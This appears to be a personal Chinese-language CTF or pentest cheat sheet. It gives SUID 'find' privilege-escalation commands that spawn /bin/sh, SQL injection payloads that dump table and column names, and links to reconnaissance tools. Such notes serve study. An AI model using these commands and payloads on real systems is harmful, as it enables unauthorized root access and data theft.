### `find` 提权
find提权的原理在于find命令具有特殊权限
同理，如若其他命令也具有特殊权限，也能实现提权

```zsh
find / -perm -u=s -type f 2>/dev/null


1. find ./ acce -exec '/bin/sh' \;

2. touch bcce
find bcce -exec '/bin/sh' \;
```

### `searchsploit`

```
msfconsole
searchsploit
/usr/share/exploitdb
```

### `SQL` 注入

```
username=a' or 1 #
a' or 1 union select 1,group_concat(flag),3 from flag#            

table_schema=database();                           


admin' or '1'='1' 
union select 1,group_concat(column_name),3 
from information_schema.columns 
where table_name='flag'#
```

### 收集站点信息
[[cewl]]工具会对指定url进行扫描，随后生成字典

### 针对wordpress扫描
[[wpscan]]

### 主机发现
[[arp-scan]]
[[netdiscover]]

### 目录扫描
[[dirsearch]]

